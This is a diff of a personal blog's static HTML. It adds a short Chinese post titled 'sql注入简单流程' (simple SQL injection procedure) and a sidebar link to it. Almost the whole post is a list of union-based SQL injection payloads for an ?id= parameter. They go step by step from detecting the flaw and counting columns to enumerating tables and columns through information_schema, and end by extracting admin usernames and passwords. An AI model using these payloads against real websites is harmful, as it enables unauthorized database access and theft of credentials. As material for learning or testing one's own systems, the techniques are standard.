@@ -64,6 +64,65 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/24/sql-1/" class="article-date">
+  <time datetime="2020-09-24T14:32:50.000Z" itemprop="datePublished">2020-09-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/24/sql-1/">sql注入简单流程</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##<strong>第一步，判断是否存在sql注入漏洞</strong></p>
+<p>###?id=1 and 1=1——–页面返回正常</p>
+<p>###?id=1 and 1=2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞</p>
+<p>##<strong>第二步:判断字段数</strong></p>
+<p>###?id=1 and 1=1 order by 1  回车——-页面正常</p>
+<p>###?id=1 and 1=1 order by 2  回车——-页面正常</p>
+<p>###?id=1 and 1=1 order by 3  回车——-页面不正常</p>
+<p>##<strong>第三步：判断回显点</strong></p>
+<p>###?id=1 and 1=2 union select 1,2——页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
+<p>##<strong>第四步:查询相关内容</strong></p>
+<p>###查询当前数据库名</p>
+<p>###?id=1 and 1=2 union select 1,database() </p>
+<p>###查询当前数据库版本</p>
+<p>###?id=1 and 1=2 union select 1,version() </p>
+<p>###查询当前数据库 表名</p>
+<p>###?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
+<p>###查询字段名</p>
+<p>###?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 </p>
+<p>###?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1————查出 admin 表里 有  id  username  password  三个字段</p>
+<p>###查询字段内容</p>
+<p>###?id=1 and 1=2 union select 1,username from admin  limit 0,1</p>
+<p>###?id=1 and 1=2 union select 1,password from admin  limit 1,1</p>
+<p>###?id=1 and 1=2 union select 1,password from admin  limit 0,1</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/09/24/sql-1/" data-id="ckfgxhpuc0000ywv18soge7mk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-hello-blog" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/09/23/hello-blog/" class="article-date">
@@ -178,6 +237,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/09/24/sql-1/">sql注入简单流程</a>
+          </li>
         
           <li>
             <a href="/2020/09/23/hello-blog/">hello blog</a>
